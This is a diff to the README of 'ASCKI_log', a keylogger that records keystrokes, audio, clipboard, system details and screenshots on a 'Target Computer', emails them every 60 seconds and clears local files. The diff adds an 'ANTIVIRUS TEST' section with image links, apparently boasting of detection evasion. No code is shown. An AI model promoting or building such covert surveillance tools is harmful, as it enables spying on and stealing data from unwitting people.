@@ -2,8 +2,8 @@
 
 Welcome to the ASCKI_log repo! 
 ASCKI_log is a logging script. This logger records your
-Keystrokes, Audio, Clipboard, System Information and 
-Screenshort image of working screen.It automatically sends logged
+**Keystrokes, Audio, Clipboard, System Information and 
+Screenshort image of working screen**.It automatically sends logged
 files to given email and cleans local space.
 
 ## INSTALLATION
@@ -20,3 +20,10 @@ files to given email and cleans local space.
 •**Run ASCKI_log on Target Computer**
 
 •**Every 60 seconds,You Get the Data from the Target Computer**
+
+## ANTIVIRUS TEST
+
+![github-small](https://github.com/TarunPereddi/ASCKI_log.py/blob/main/Images/GIT1.jpg)
+
+![github-small](https://github.com/TarunPereddi/ASCKI_log.py/blob/main/Images/GIT2.jpg)
+
